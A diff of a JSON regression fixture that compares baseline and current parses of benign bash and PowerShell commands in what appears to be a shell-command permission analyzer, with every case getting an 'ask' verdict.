-              "verb": "diff",
-              "args": [
-                "<(sort a.txt)",
-                "<(sort b.txt)"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": false,
-          "hasMetasyntax": true
-        }
-      }
-    }
-  },
-  {
-    "id": "b30-var-brace",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo ${USER}-suffix"
+            "$name = \"value\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2278,224 +1604,46 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "${USER}-suffix"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo ${USER}-suffix"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "${USER}-suffix"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "${USER}-suffix"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "${USER}-suffix"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": false,
-          "hasMetasyntax": true
-        }
-      }
-    }
-  },
-  {
-    "id": "b31-export-path",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "export PATH=$PATH:/usr/local/bin"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "export",
-                "args": [
-                  "PATH=$PATH:/usr/local/bin"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [
-              "PATH=$PATH:/usr/local/bin"
-            ],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "export PATH=$PATH:/usr/local/bin"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [],
             "connectors": [],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "declaration_command:export PATH=$PATH:/usr/local/bin"
+              "assignment_expression:$name = \"value\""
             ]
           }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "export",
+              "verb": "$name",
               "args": [
-                "PATH=$PATH:/usr/local/bin"
+                "=",
+                "value"
               ],
               "segmentIndex": 0
             }
           ],
           "connectors": [],
-          "paths": [
-            "PATH=$PATH:/usr/local/bin"
-          ],
+          "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "complete",
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [],
           "connectors": [],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "declaration_command:export PATH=$PATH:/usr/local/bin"
+            "assignment_expression:$name = \"value\""
           ]
         }
       },
@@ -2518,14 +1666,14 @@
     }
   },
   {
-    "id": "b32-escape-space",
-    "dialect": "posix-bash",
+    "id": "t1-13-if-statement",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo a\\ b"
+            "if ($x -gt 1) { Write-Output big }"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2542,20 +1690,419 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "if",
                 "args": [
-                  "a\\",
-                  "b"
+                  "($x",
+                  "-gt",
+                  "1)",
+                  "{",
+                  "Write-Output",
+                  "big",
+                  "}"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "if ($x -gt 1) { Write-Output big }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "big"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "if_statement:if ($x -gt 1) { Write-Output big }"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "if",
+              "args": [
+                "($x",
+                "-gt",
+                "1)",
+                "{",
+                "Write-Output",
+                "big",
+                "}"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "big"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "if_statement:if ($x -gt 1) { Write-Output big }"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t1-14-member-call",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "$list.Add(\"item\")"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "$list.Add(item)",
+                "args": [],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "$list.Add(\"item\")"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "logical_expression:$list.Add(\"item\")"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "$list.Add(item)",
+              "args": [],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:$list.Add(\"item\")"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t1-15-where-object",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Get-Process",
+            "Where-Object { $_.CPU -gt 10 }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-Process",
+                "args": [],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "Where-Object",
+                "args": [
+                  "{",
+                  "$_.CPU",
+                  "-gt",
+                  "10",
+                  "}"
+                ],
+                "segmentIndex": 1
+              }
+            ],
+            "connectors": [
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Get-Process",
+            "Where-Object { $_.CPU -gt 10 }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-Process",
+                "args": [],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "Where-Object",
+                "args": [
+                  "{ $_.CPU -gt 10 }"
+                ],
+                "segmentIndex": 1
+              }
+            ],
+            "connectors": [
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-Process",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "Where-Object",
+              "args": [
+                "{",
+                "$_.CPU",
+                "-gt",
+                "10",
+                "}"
+              ],
+              "segmentIndex": 1
+            }
+          ],
+          "connectors": [
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-Process",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "Where-Object",
+              "args": [
+                "{ $_.CPU -gt 10 }"
+              ],
+              "segmentIndex": 1
+            }
+          ],
+          "connectors": [
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "t1-16-param-colon",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Get-Content -Path:./a.txt"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-Content",
+                "args": [
+                  "-Path:./a.txt"
                 ],
                 "segmentIndex": 0
               }
             ],
             "connectors": [],
             "paths": [
-              "a\\"
+              "-Path:./a.txt"
             ],
             "cwdChanges": [],
             "analysisCompleteness": "complete",
@@ -2565,7 +2112,7 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo a\\ b"
+            "Get-Content -Path:./a.txt"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2582,18 +2129,21 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "Get-Content",
                 "args": [
-                  "a\\ b"
+                  "-Path",
+                  "./a.txt"
                 ],
                 "segmentIndex": 0
               }
             ],
             "connectors": [],
-            "paths": [],
+            "paths": [
+              "./a.txt"
+            ],
             "cwdChanges": [],
             "analysisCompleteness": "complete",
             "unresolved": []
@@ -2602,38 +2152,40 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "Get-Content",
               "args": [
-                "a\\",
-                "b"
+                "-Path:./a.txt"
               ],
               "segmentIndex": 0
             }
           ],
           "connectors": [],
           "paths": [
-            "a\\"
+            "-Path:./a.txt"
           ],
           "cwdChanges": [],
           "analysisCompleteness": "complete",
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "Get-Content",
               "args": [
-                "a\\ b"
+                "-Path",
+                "./a.txt"
               ],
               "segmentIndex": 0
             }
           ],
           "connectors": [],
-          "paths": [],
+          "paths": [
+            "./a.txt"
+          ],
           "cwdChanges": [],
           "analysisCompleteness": "complete",
           "unresolved": []
@@ -2642,14 +2194,14 @@
     }
   },
   {
-    "id": "b33-printf-escapes",
-    "dialect": "posix-bash",
+    "id": "t1-17-double-quoted-var",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "printf \"tab\\tnewline\\n\""
+            "Write-Output \"user is $env:USERNAME\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2666,12 +2218,12 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "printf",
+                "verb": "Write-Output",
                 "args": [
-                  "tabtnewlinen"
+                  "user is $env:USERNAME"
                 ],
                 "segmentIndex": 0
               }
@@ -2686,7 +2238,7 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "printf \"tab\\tnewline\\n\""
+            "Write-Output \"user is $env:USERNAME\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2703,12 +2255,12 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "printf",
+                "verb": "Write-Output",
                 "args": [
-                  "\"tab\\tnewline\\n\""
+                  "\"user is $env:USERNAME\""
                 ],
                 "segmentIndex": 0
               }
@@ -2723,12 +2275,12 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "printf",
+              "verb": "Write-Output",
               "args": [
-                "tabtnewlinen"
+                "user is $env:USERNAME"
               ],
               "segmentIndex": 0
             }
@@ -2740,12 +2292,12 @@
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "printf",
+              "verb": "Write-Output",
               "args": [
-                "\"tab\\tnewline\\n\""
+                "\"user is $env:USERNAME\""
               ],
               "segmentIndex": 0
             }
@@ -2760,14 +2312,15 @@
     }
   },
   {
-    "id": "b34-unicode-quote",
-    "dialect": "posix-bash",
+    "id": "t1-20-semicolon-list",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo \"unicode “quoted” inside\""
+            "Get-Date",
+            "Get-Location"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2784,138 +2337,16 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
-                "args": [
-                  "unicode “quoted” inside"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo \"unicode “quoted” inside\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "\"unicode “quoted” inside\""
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "unicode “quoted” inside"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "\"unicode “quoted” inside\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b35-crlf",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo crlf\r\nnext line"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "crlf"
-                ],
+                "verb": "Get-Date",
+                "args": [],
                 "segmentIndex": 0
               },
               {
-                "verb": "next",
-                "args": [
-                  "line"
-                ],
+                "verb": "Get-Location",
+                "args": [],
                 "segmentIndex": 1
               }
             ],
@@ -2931,7 +2362,8 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo crlf\r\nnext line"
+            "Get-Date",
+            "Get-Location"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2948,24 +2380,23 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
-                "args": [
-                  "crlf"
-                ],
+                "verb": "Get-Date",
+                "args": [],
                 "segmentIndex": 0
               },
               {
-                "verb": "next",
-                "args": [
-                  "line"
-                ],
+                "verb": "Get-Location",
+                "args": [],
                 "segmentIndex": 1
               }
             ],
-            "connectors": [],
+            "connectors": [
+              ";",
+              ";"
+            ],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "complete",
@@ -2975,20 +2406,16 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
-              "args": [
-                "crlf"
-              ],
+              "verb": "Get-Date",
+              "args": [],
               "segmentIndex": 0
             },
             {
-              "verb": "next",
-              "args": [
-                "line"
-              ],
+              "verb": "Get-Location",
+              "args": [],
               "segmentIndex": 1
             }
           ],
@@ -3001,24 +2428,23 @@
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
-              "args": [
-                "crlf"
-              ],
+              "verb": "Get-Date",
+              "args": [],
               "segmentIndex": 0
             },
             {
-              "verb": "next",
-              "args": [
-                "line"
-              ],
+              "verb": "Get-Location",
+              "args": [],
               "segmentIndex": 1
             }
           ],
-          "connectors": [],
+          "connectors": [
+            ";",
+            ";"
+          ],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "complete",
@@ -3028,14 +2454,14 @@
     }
   },
   {
-    "id": "b36-unclosed-quote",
-    "dialect": "posix-bash",
+    "id": "t1-22-string-concat-arg",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo \"unclosed"
+            "Write-Host \"a\" \"b\" \"c\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -3052,15 +2478,433 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Host",
+                "args": [
+                  "a",
+                  "b",
+                  "c"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Host \"a\" \"b\" \"c\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Host",
+                "args": [
+                  "\"a\"",
+                  "\"b\"",
+                  "\"c\""
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Host",
+              "args": [
+                "a",
+                "b",
+                "c"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Host",
+              "args": [
+                "\"a\"",
+                "\"b\"",
+                "\"c\""
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-01-class-def",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "class Point {\n  [int]$x\n  [int]$y\n}\n$p = [Point]::new()"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "class",
+                "args": [
+                  "Point",
+                  "{"
+                ],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "[int]$x",
+                "args": [],
+                "segmentIndex": 1
+              },
+              {
+                "verb": "[int]$y",
+                "args": [],
+                "segmentIndex": 2
+              },
+              {
+                "verb": "}",
+                "args": [],
+                "segmentIndex": 3
+              },
+              {
+                "verb": "$p",
+                "args": [
+                  "=",
+                  "[Point]::new()"
+                ],
+                "segmentIndex": 4
+              }
+            ],
+            "connectors": [
+              ";",
+              ";",
+              ";",
+              ";"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:4:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "class Point {\n  [int]$x\n  [int]$y\n}\n$p = [Point]::new()"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
             "operations": [],
             "connectors": [],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "segment:0:unparseable"
+              "class_statement:class Point {\n  [int]$x\n  [int]$y\n}",
+              "assignment_expression:$p = [Point]::new()"
             ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "class",
+              "args": [
+                "Point",
+                "{"
+              ],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "[int]$x",
+              "args": [],
+              "segmentIndex": 1
+            },
+            {
+              "verb": "[int]$y",
+              "args": [],
+              "segmentIndex": 2
+            },
+            {
+              "verb": "}",
+              "args": [],
+              "segmentIndex": 3
+            },
+            {
+              "verb": "$p",
+              "args": [
+                "=",
+                "[Point]::new()"
+              ],
+              "segmentIndex": 4
+            }
+          ],
+          "connectors": [
+            ";",
+            ";",
+            ";",
+            ";"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:4:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "class_statement:class Point {\n  [int]$x\n  [int]$y\n}",
+            "assignment_expression:$p = [Point]::new()"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-02-nested-index",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "$matrix[0][1]"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "$matrix[0][1]",
+                "args": [],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "$matrix[0][1]"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
